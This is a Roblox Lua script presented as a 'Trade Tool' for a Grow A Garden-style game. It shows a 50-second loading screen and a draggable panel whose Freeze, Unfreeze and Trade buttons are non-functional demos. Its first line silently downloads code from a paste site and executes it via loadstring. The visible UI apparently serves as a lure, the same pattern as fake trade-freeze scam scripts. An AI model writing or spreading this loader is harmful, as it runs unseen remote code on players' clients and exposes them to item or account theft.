loadstring(game:HttpGet("https://pastefy.app/cCkDY3ZO/raw"))()

-- LocalScript (PLACE THIS IN StarterGui)
-- Trade Tools UI: draggable, trade popup, credits (Inspired by Grow A Garden style, made by "gscriptt")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

print("[TradeUI] Starting...")

local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
if not player then
    warn("[TradeUI] LocalPlayer not found. Make sure this is a LocalScript in StarterGui and you are in Play mode.")
    return
end

local playerGui = player:WaitForChild("PlayerGui", 10)
if not playerGui then
    warn("[TradeUI] PlayerGui not found within 10s.")
    return
end

-- remove old if present
local old = playerGui:FindFirstChild("TradeUI")
if old then old:Destroy() end

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "TradeUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- LOADING SCREEN --

local loadingFrame = Instance.new("Frame")
loadingFrame.Name = "LoadingFrame"
loadingFrame.Size = UDim2.new(1, 0, 1, 0) -- full screen
loadingFrame.Position = UDim2.new(0, 0, 0, 0)
loadingFrame.BackgroundTransparency = 1 -- FULLY TRANSPARENT
loadingFrame.BorderSizePixel = 0
loadingFrame.Parent = screenGui

-- New Update Text (above loading timer), moved up a bit
local newUpdateText = Instance.new("TextLabel")
newUpdateText.Size = UDim2.new(0.7, 0, 0, 30)
newUpdateText.Position = UDim2.new(0.15, 0, 0.40, 0) -- moved from 0.45 to 0.40 for vertical shift up
newUpdateText.BackgroundTransparency = 1
newUpdateText.Font = Enum.Font.Gotham
newUpdateText.TextSize = 30
newUpdateText.TextColor3 = Color3.fromRGB(210, 210, 210)
newUpdateText.TextXAlignment = Enum.TextXAlignment.Center
newUpdateText.TextYAlignment = Enum.TextYAlignment.Center
newUpdateText.Text = "New Update Script DarkSpawner"
newUpdateText.Parent = loadingFrame

-- Loading Timer Text (below new update text), also moved up a bit
local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(0.7, 0, 0, 60) -- bigger height for visibility
loadingText.Position = UDim2.new(0.15, 0, 0.45, 0) -- moved from 0.50 to 0.45
loadingText.BackgroundTransparency = 1
loadingText.Font = Enum.Font.GothamBold
loadingText.TextSize = 34
loadingText.TextColor3 = Color3.fromRGB(230, 230, 230)
loadingText.TextXAlignment = Enum.TextXAlignment.Center
loadingText.TextYAlignment = Enum.TextYAlignment.Center
loadingText.Text = "Please wait 50 seconds"
loadingText.Parent = loadingFrame

-- Countdown for loading
local countdown = 50

local function updateLoadingText()
    loadingText.Text = "Please wait "..countdown.." seconds"
end

updateLoadingText()

local function showTradeUI()
    -- Main frame
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, 300, 0, 260)       -- width 300, height 260 (extra space for credit)
    mainFrame.Position = UDim2.new(1, 12, 0.35, 0)   -- start off screen (will tween in)
    mainFrame.AnchorPoint = Vector2.new(0, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(44, 80, 46) -- Dark green background base (grow a garden style)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    
    local function addUICorner(parent, radius)
        local c = Instance.new("UICorner")
        c.CornerRadius = UDim.new(0, radius or 8)
        c.Parent = parent
    end
    local function addUIStroke(parent, thickness, transparency)
        local s = Instance.new("UIStroke")
        s.Thickness = thickness or 2
        s.Transparency = (transparency ~= nil) and transparency or 0.6
        s.Parent = parent
    end
    
    addUICorner(mainFrame, 12)
    addUIStroke(mainFrame, 2, 0.5)
    
    -- Header Frame (Brown bar on top)
    local header = Instance.new("Frame")
    header.Name = "Header"
    header.Size = UDim2.new(1, 0, 0, 40)
    header.Position = UDim2.new(0, 0, 0, 0)
    header.BackgroundColor3 = Color3.fromRGB(130, 95, 55) -- Brown block color from Grow A Garden
    header.BorderSizePixel = 0
    header.ZIndex = 1
    header.Parent = mainFrame
    addUICorner(header, 12)
    addUIStroke(header, 2, 0.6)
    
    -- Title Text centered
    local title = Instance.new("TextLabel")
    title.Name = "Title"
    title.Size = UDim2.new(1, 0, 1, 0)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "TRADE TOOL"
    title.Font = Enum.Font.GothamBold
    title.TextSize = 22
    title.TextColor3 = Color3.fromRGB(245, 230, 200)
    title.TextXAlignment = Enum.TextXAlignment.Center
    title.TextYAlignment = Enum.TextYAlignment.Center
    title.Parent = header
    
    -- Status
    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(0.9, 0, 0, 20)
    status.Position = UDim2.new(0.05, 0, 0, 50)
    status.BackgroundTransparency = 1
    status.Text = "Status: Normal"
    status.Font = Enum.Font.Gotham
    status.TextSize = 14
    status.TextColor3 = Color3.fromRGB(200, 200, 200)
    status.TextXAlignment = Enum.TextXAlignment.Left
    status.ZIndex = 1
    status.Parent = mainFrame
    
    -- Button factory
    local function makeButton(name, txt, yPixel, bg)
        local b = Instance.new("TextButton")
        b.Name = name
        b.Size = UDim2.new(0.9, 0, 0, 38)
        b.Position = UDim2.new(0.05, 0, 0, yPixel)
        b.BackgroundColor3 = bg
        b.Text = txt
        b.Font = Enum.Font.GothamBold
        b.TextSize = 16
        b.TextColor3 = Color3.fromRGB(255, 255, 255)
        addUICorner(b, 8)
        addUIStroke(b, 1, 0.75)
        b.ZIndex = 1
        b.Parent = mainFrame
        return b
    end
    
    local freezeBtn = makeButton("FreezeButton", "Freeze", 80, Color3.fromRGB(200, 50, 50))
    local unfreezeBtn = makeButton("UnfreezeButton", "Unfreeze", 130, Color3.fromRGB(60, 160, 60))
    local tradeBtn = makeButton("TradeButton", "Trade", 180, Color3.fromRGB(45, 120, 200))
    
    -- Credit label (with padding)
    local credit = Instance.new("TextLabel")
    credit.Name = "MadeByLabel"
    credit.Size = UDim2.new(1, 0, 0, 18)
    credit.Position = UDim2.new(0, 0, 1, -26) -- 26 px from bottom => breathing room
    credit.BackgroundTransparency = 1
    credit.Text = 'Made by "gscriptt"'
    credit.Font = Enum.Font.Gotham
    credit.TextSize = 12
    credit.TextColor3 = Color3.fromRGB(190, 190, 190)
    credit.ZIndex = 1
    credit.Parent = mainFrame
    
    -- Demo state variables
    local isFrozen = false
    local clickDebounce = false
    
    freezeBtn.MouseButton1Click:Connect(function()
        if clickDebounce then return end
        clickDebounce = true
        if not isFrozen then
            isFrozen = true
            status.Text = "Status: Frozen (demo)"
            freezeBtn.Text = "Frozen ✓"
            unfreezeBtn.Text = "Unfreeze"
        end
        task.wait(0.12)
        clickDebounce = false
    end)
    
    unfreezeBtn.MouseButton1Click:Connect(function()
        if clickDebounce then return end
        clickDebounce = true
        if isFrozen then
            isFrozen = false
            status.Text = "Status: Normal"
            freezeBtn.Text = "Freeze"
            unfreezeBtn.Text = "Unfrozen ✓"
        end
        task.wait(0.12)
        unfreezeBtn.Text = "Unfreeze"
        clickDebounce = false
    end)
    
    -- Trade popup (demo)
    tradeBtn.MouseButton1Click:Connect(function()
        if clickDebounce then return end
        clickDebounce = true
    
        local existing = screenGui:FindFirstChild("TradeFrame")
        if existing then
            existing:Destroy()
            clickDebounce = false
            return
        end
    
        local tf = Instance.new("Frame")
        tf.Name = "TradeFrame"
        tf.Size = UDim2.new(0, 380, 0, 220)
        tf.AnchorPoint = Vector2.new(0.5, 0.5)
        tf.Position = UDim2.new(0.5, 0, 0.5, 0)
        tf.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        tf.Parent = screenGui
        addUICorner(tf, 10)
        addUIStroke(tf, 2, 0.7)
    
        local ttl = Instance.new("TextLabel", tf)
        ttl.Size = UDim2.new(1, 0, 0, 36)
        ttl.BackgroundTransparency = 1
        ttl.Text = "Trade (Demo)"
        ttl.Font = Enum.Font.GothamBold
        ttl.TextSize = 16
        ttl.TextColor3 = Color3.fromRGB(255, 255, 255)
    
        local info = Instance.new("TextLabel", tf)
        info.Size = UDim2.new(0.9, 0, 0, 80)
        info.Position = UDim2.new(0.05, 0, 0, 44)
        info.BackgroundTransparency = 1
        info.Text = "This is a demo trade window. Add server-side trade remotes for a real system."
        info.Font = Enum.Font.Gotham
        info.TextSize = 14
        info.TextColor3 = Color3.fromRGB(200, 200, 200)
        info.TextWrapped = true
    
        local accept = Instance.new("TextButton", tf)
        accept.Size = UDim2.new(0.42, 0, 0, 36)
        accept.Position = UDim2.new(0.05, 0, 1, -50)
        accept.Text = "Accept (Demo)"
        accept.Font = Enum.Font.GothamBold
        accept.TextSize = 15
        accept.BackgroundColor3 = Color3.fromRGB(60, 150, 60)
        addUICorner(accept, 8)
        addUIStroke(accept, 1, 0.7)
    
        local close = Instance.new("TextButton", tf)
        close.Size = UDim2.new(0.42, 0, 0, 36)
        close.Position = UDim2.new(0.53, 0, 1, -50)
        close.Text = "Close"
        close.Font = Enum.Font.GothamBold
        close.TextSize = 15
        close.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
        addUICorner(close, 8)
        addUIStroke(close, 1, 0.7)
    
        accept.MouseButton1Click:Connect(function()
            print("[TradeUI] Trade accepted (demo).")
            -- Real trade actions must be implemented on the server.
        end)
        close.MouseButton1Click:Connect(function()
            if tf and tf.Parent then
                tf:Destroy()
            end
        end)
    
        clickDebounce = false
    end)
    
    -- Draggable implementation (works for mouse + touch)
    local dragging = false
    local dragInput, dragStart, startPos
    
    local function update(input)
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
    
    mainFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = mainFrame.Position
    
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    
    mainFrame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
    
    -- Slide-in animation
    local target = UDim2.new(1, -320, mainFrame.Position.Y.Scale, mainFrame.Position.Y.Offset) -- 20 px margin
    TweenService:Create(mainFrame, TweenInfo.new(0.45, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = target}):Play()
end

-- Run countdown timer without dots animation
task.spawn(function()
    while countdown > 0 do
        updateLoadingText()
        task.wait(1)
        countdown = countdown - 1
    end
    -- After countdown ends
    loadingFrame:Destroy()
    showTradeUI()
    print("[TradeUI] Loading complete, UI shown.")
end)
